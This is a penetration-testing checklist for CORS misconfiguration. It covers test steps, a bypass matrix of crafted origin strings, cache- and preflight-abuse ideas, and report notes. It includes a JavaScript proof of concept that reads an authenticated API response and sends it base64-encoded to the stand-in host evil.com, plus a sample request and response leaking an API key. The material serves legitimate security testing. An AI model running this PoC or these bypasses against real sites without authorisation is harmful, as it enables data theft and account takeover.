# CORS Misconfiguration

**What it is:** Overly permissive cross-origin sharing lets an attacker page read authenticated responses from the victim's session.

## Test steps
- [ ] Reflect arbitrary origin: send `Origin: https://evil.com` → response `Access-Control-Allow-Origin: https://evil.com` + `Allow-Credentials: true` = critical.
- [ ] `null` origin accepted (`Origin: null` via sandboxed iframe/data URI).
- [ ] Prefix/suffix regex flaws: `evil-target.com`, `target.com.evil.com`, `targetXcom`.
- [ ] Subdomain trust + a subdomain XSS/takeover → read from parent.
- [ ] `Allow-Origin: *` with sensitive data (only exploitable without creds, still note).
- [ ] Pre-flight bypass, or trusting `Origin` without `Vary: Origin` (cache issues).

## PoC
```javascript
fetch('https://api.target.com/me', {credentials:'include'})
  .then(r=>r.text()).then(d=>fetch('https://evil.com/log?d='+btoa(d)));
```

## Impact
Theft of authenticated data (PII, tokens, CSRF tokens) → often chains to ATO.

## 🎯 PoC — Request → Response (reflected origin + credentials)

```http
GET /api/v2/account/me HTTP/2
Host: api.target.com
Origin: https://evil.com
Cookie: session=<victim>
```
```http
HTTP/2 200 OK
Access-Control-Allow-Origin: https://evil.com     ← reflected attacker origin
Access-Control-Allow-Credentials: true            ← + credentials = critical
Content-Type: application/json

{"id":"3a1f...","email":"victim@corp.com","api_key":"sk_live_...","csrf":"a9f.."}
```
`evil.com` can now read this authenticated body cross-origin (steals `api_key`, CSRF token → ATO). Reflected origin **without** `Allow-Credentials: true` = low/no impact.

## Deep cuts — validator flaws & cache-amplified CORS
- [ ] **Regex/substring bypass matrix:** `target.com.evil.com`, `evil-target.com`, `eviltarget.com`, `target.com.evil.com`, `xtargetxcom` (dots-as-any), `target.com%60.evil.com`, trailing-dot `target.com.`, unicode/IDN homoglyph, and `null` (sandboxed iframe/`data:`/`about:blank`). Test port and scheme variants (`http://` vs `https://`).
- [ ] **`Vary: Origin` missing → cache-poisoned CORS:** if a permissive `ACAO` gets cached without varying on `Origin`, the attacker's `ACAO: evil.com` is served to *other* users (or a victim's authed body cached and served to you) — turns a reflected-origin quirk into stored exploitation (`08-infra/03`).
- [ ] **Method/path asymmetry:** `ACAO` reflected only on `OPTIONS` or on a specific route (`/api/v3/me` vs `/me`) — probe each verb + path; the loose one is the bug.
- [ ] **Over-broad `ACA-Headers`/`ACA-Methods`:** wildcard `Access-Control-Allow-Headers: *` or reflected → lets a preflighted request carry auth headers; `Allow-Credentials: true` with reflected headers = full authed read/write.
- [ ] **Wildcard-with-creds quirk:** `ACAO: *` + credentials is spec-illegal (browser blocks), but some stacks reflect `*` for unauth data that's still sensitive (API keys in an unauth response).
- [ ] **Subdomain trust → chain:** `ACAO` trusts `*.target.com`; combine with a subdomain XSS/takeover (`08-infra/01`) or an open-redirect on a trusted subdomain to read from the parent.
- [ ] **Private-network / internal CORS:** an internal admin app reflects `Origin` and is reachable via DNS-rebinding/SSRF → read internal data cross-origin.
- [ ] **Preflight-cache abuse (`Access-Control-Max-Age`):** poison a long-lived preflight allow, then send the real request.
- [ ] **Chain to ATO:** the readable body carries session/CSRF token/API key → impersonate or forge state-changing requests (`09-advanced/07`).

## Report notes
Show the reflected `ACAO: evil.com` + `ACAC: true` and a PoC exfiltrating your own account data cross-origin. Reflected origin **without** `Allow-Credentials` is usually low/no impact — state that honestly. If cache-amplified, show the poisoned `ACAO` served to a second client.
